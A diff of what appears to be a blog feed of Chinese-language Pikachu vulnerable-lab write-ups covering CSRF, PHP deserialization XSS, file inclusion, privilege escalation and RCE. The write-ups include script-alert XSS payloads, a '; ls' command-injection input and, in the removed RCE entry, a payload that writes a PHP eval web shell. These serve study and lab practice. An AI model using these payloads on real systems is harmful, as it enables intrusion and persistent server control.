@@ -9,7 +9,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">姓名:vince</span><br><span class="line">性别:boy</span><br><span class="line">手机:<span class="number">18626545453</span></span><br><span class="line">住址:chain</span><br><span class="line">邮箱:vince@pikachu.com</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../../img/docs/pikachu/CSRF/1738227135473-867932c7-ce88-4729-bbac-e290b62a7b19.png"></p>
-<p>将邮箱修改成 <a href="mailto:&#x6d;&#111;&#x76;&#x40;&#x70;&#x69;&#x6b;&#x61;&#x63;&#104;&#x75;&#46;&#x63;&#x6f;&#109;">mov@pikachu.com</a> 了。</p>
+<p>将邮箱修改成 <a href="mailto:&#x6d;&#x6f;&#118;&#x40;&#112;&#x69;&#107;&#97;&#x63;&#x68;&#x75;&#46;&#99;&#x6f;&#x6d;">mov@pikachu.com</a> 了。</p>
 <p>不过没看到它在 URL 有显示 GET 获取的数据罢了。</p>
 <p>我们看一下浏览器中表单中各个组件的 name 值</p>
 <p><img src="/../../img/docs/pikachu/CSRF/1738241890213-eb70ddd3-a33a-41a8-bd61-bb3ab34ee2dd.png"></p>
@@ -44,6 +44,81 @@
 <p>**问题：**为什么不管是 GET 构造还是 POST 构造，第一次都会导致浏览器失去 cookie 信息，第二次才能成功？</p>
 <p>浏览器对策？</p>
 ]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化</title>
+    <url>/posts/17013.html</url>
+    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化  serialize()"></a>序列化  serialize()</h2><p>把一个对象变成可以传输的字符串</p>
+<h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>把被序列化的字符串还原成对象</p>
+<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>一开局就然我们输入一个序列化数据，不知道想干啥，我们就随便写一个对象</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入进去，发现下面文本有一个输出了一个 pikachu，真神奇，不知道怎么实现的？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们再输入进去，发现输出的 hello，莫非是输出最后一个变量？</p>
+<p>不管了，既然在网页中直接输出字符串，我们开始构造。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现还是输出的 pikachu，科师刚才为啥会输出 hello 呢，我们放到第二个试试？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>OK,完美收工，应该是获取第二个的变量，从而输出在网页上。</p>
+<p><img src="/../../img/docs/pikachu/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1738632342371-4ea7e487-6a91-497a-8589-2f54ccbd12a1.png"></p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>很明显，这里代码根本就没给类 S 实例化，所以也就没用到魔法函数，只是下面的判断语句起了用途，并且不是我想的 需要第二个，还是变量名称腰围 test 就可以了，笑。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>File Inclusion</title>
+    <url>/posts/51912.html</url>
+    <content><![CDATA[<p><strong>文件包含漏洞</strong></p>
+<ol>
+<li><strong>本地文件包含漏洞</strong></li>
+<li><strong>远程文件包含漏洞</strong></li>
+</ol>
+<p>include、include_once、require、require_once</p>
+<p><strong>include 和 requrie 的区别</strong></p>
+<p>include 包含有错误还会继续运行，而 require 会中止。</p>
+<p><strong>xxx 和 xxx_once 的区别</strong></p>
+<p>once 只会运行一次</p>
+<p>下面的 local 和 remote 的区别就是，看一下代码</p>
+<p>local 的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>remote 的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 local 的代码明显自由度不高，被 include&#x2F;限制了，但是我们可以用.. .这样的符号在本地内 include。</p>
+<p>remote 不仅可以在本地，还可以用 URL 引用互联网上的 php 以及其他的文件。</p>
+<h1 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h1><h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1>]]></content>
       <categories>
         <category>网安</category>
         <category>靶场</category>
@@ -172,183 +247,6 @@
 <p>将<script>进行闭合，在构造自己的事件。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>File Inclusion</title>
-    <url>/posts/51912.html</url>
-    <content><![CDATA[<p><strong>文件包含漏洞</strong></p>
-<ol>
-<li><strong>本地文件包含漏洞</strong></li>
-<li><strong>远程文件包含漏洞</strong></li>
-</ol>
-<p>include、include_once、require、require_once</p>
-<p><strong>include 和 requrie 的区别</strong></p>
-<p>include 包含有错误还会继续运行，而 require 会中止。</p>
-<p><strong>xxx 和 xxx_once 的区别</strong></p>
-<p>once 只会运行一次</p>
-<p>下面的 local 和 remote 的区别就是，看一下代码</p>
-<p>local 的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>remote 的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到 local 的代码明显自由度不高，被 include&#x2F;限制了，但是我们可以用.. .这样的符号在本地内 include。</p>
-<p>remote 不仅可以在本地，还可以用 URL 引用互联网上的 php 以及其他的文件。</p>
-<h1 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h1><h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1>]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP反序列化</title>
-    <url>/posts/17013.html</url>
-    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化  serialize()"></a>序列化  serialize()</h2><p>把一个对象变成可以传输的字符串</p>
-<h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>把被序列化的字符串还原成对象</p>
-<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
-
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>一开局就然我们输入一个序列化数据，不知道想干啥，我们就随便写一个对象</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输入进去，发现下面文本有一个输出了一个 pikachu，真神奇，不知道怎么实现的？</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们再输入进去，发现输出的 hello，莫非是输出最后一个变量？</p>
-<p>不管了，既然在网页中直接输出字符串，我们开始构造。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现还是输出的 pikachu，科师刚才为啥会输出 hello 呢，我们放到第二个试试？</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>OK,完美收工，应该是获取第二个的变量，从而输出在网页上。</p>
-<p><img src="/../../img/docs/pikachu/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1738632342371-4ea7e487-6a91-497a-8589-2f54ccbd12a1.png"></p>
-<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>很明显，这里代码根本就没给类 S 实例化，所以也就没用到魔法函数，只是下面的判断语句起了用途，并且不是我想的 需要第二个，还是变量名称腰围 test 就可以了，笑。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Over Permisson</title>
-    <url>/posts/687.html</url>
-    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>我们输入 kobe 的账号密码，进入进去，查看个人资料，我们发现 URL 上面的信息，我们可以尝试改成其他用户名(lucy&#x2F;lili&#x2F;kobe)</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%<span class="number">82</span>%B9%E5%<span class="number">87</span>%BB%E6%<span class="number">9</span>F%A5%E7%<span class="number">9</span>C%<span class="number">8</span>B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%<span class="number">81</span>%AF</span><br></pre></td></tr></table></figure>
-
-<p>发现改成 lucy 的，在 kobe 页面也可以看到 lucy 的个人信息，这就是水平越权漏洞了。同样的可以看到 lili 的信息。</p>
-<p><img src="/../../img/docs/pikachu/Over_Permisson/1738553620437-17c0ab66-0230-4549-a5eb-478576d1e285.png"></p>
-<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>提供了 admin&#x2F;123456、pikachu&#x2F;000000，还说明了 admin 是超级用户，我们登录 admin 账号试试。同样的我们发现了添加用户和删除用户的 URL，我们就登录看 pikachu 这个账户看能不能利用即可。</p>
-<p>添加用户的 URL</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
-
-<p>删除用户的 URL 之一</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">6</span></span><br></pre></td></tr></table></figure>
-
-<p>发现添加用户的 URL 在 pikachu 中可以进去。</p>
-<p><img src="/../../img/docs/pikachu/Over_Permisson/1738554015974-aad2bdd0-7499-473b-9e7d-6f206391ce35.png"></p>
-<p>我们通过 admin 可以看到 hhh 的 id 为 28。我们再切换到 pikachu 去删除它，发现 pikachu 没有删除的权限。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">28</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE</title>
-    <url>/posts/4689.html</url>
-    <content><![CDATA[<p><strong>RCE</strong>(remote command&#x2F;code execute)远程命令&#x2F;代码执行。</p>
-<h1 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h1><h2 id="Docker-安装-ping-命令工具"><a href="#Docker-安装-ping-命令工具" class="headerlink" title="Docker 安装 ping 命令工具"></a>Docker 安装 ping 命令工具</h2><p>由于我们 docker 中并不能执行 ping 命令，所以我们需要安装 ping 命令的工具。</p>
-<p>我们先进入 docker pikachu 的容器（注意需要 sudo）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it [容器ID] [/bin/bash]</span><br></pre></td></tr></table></figure>
-
-<p>进去之后，就用 apt 工具进行安装</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install iputils-ping</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../img/docs/pikachu/RCE/1738494111038-a345300b-250c-443d-84b8-40d91afd33ce.png"></p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>和 SQL&#x2F;XSS 注入一样，都可以堆输入框进行命令构造。SQL 构造的是 SQL 语句，XSS 一般构造 HTML 或者 JS，而 RCE 在这里构造 SHELL 命令。</p>
-<p>在 Linux 中，ping 命令是一直执行的，所以上面应该是</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 4 [addr]</span><br></pre></td></tr></table></figure>
-
-<p>我们的输入就是 addr，这也是我们构造的地方。如果我们想查看当前目录的文件，就构造成了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 4 www.baidu.com ; ls</span><br></pre></td></tr></table></figure>
-
-<p>这里的分号是 Linux Shell 中的元字符，用于执行多条命令，几十前面的代码错了也可以执行。所以我们只需要输入 <a href="http://www.baidu.com/">www.baidu.com</a> ; ls</p>
-<p><img src="/../../img/docs/pikachu/RCE/1738496420639-d843a8f9-2f4a-4c33-9397-c50789d0efc9.png"></p>
-<p>OK，我们就可以执行其他命令。</p>
-<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>php 的一句话木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>@：后面代码错误也不报错</li>
-<li>eval 执行括号内的命令(php 代码)</li>
-<li>$_POST 通过 POST 获取数据</li>
-</ol>
-<p>$_POST[‘123’] 用于获取 123 的</p>
-<p>构造成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ping -c <span class="number">4</span> www.baidu.com ; <span class="keyword">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]); ?&gt;&#x27;</span> &gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../img/docs/pikachu/RCE/1738501130163-91a1dbee-ed07-4dd4-b9ad-4fdf9f83162f.png"></p>
-<p>我们 ls 一下，多了一个 1.php，我们就可以利用这个去提权或者怎么样了。</p>
-<p><img src="/../../img/docs/pikachu/RCE/1738501161386-be20f31a-2102-4dd6-95e3-8dc6f5adda1b.png"></p>
-<p>利用菜刀或者蚁剑工具去利用</p>
-<p><img src="/../../img/docs/pikachu/RCE/1738501310483-40b1685a-e15e-4b90-a6f6-eba41ab04a52.png"></p>
-<p>目录查看</p>
-<p><img src="/../../img/docs/pikachu/RCE/1738501341495-b7591b6c-fdf1-44ff-a1fc-8e04514f375f.png"></p>
-<p>shell 命令执行</p>
-<p><img src="/../../img/docs/pikachu/RCE/1738501366014-3800f804-6e09-4fc3-b8d3-2c4a4f2c9366.png"></p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>用 shell_exec 来执行 ping 命令的。</p>
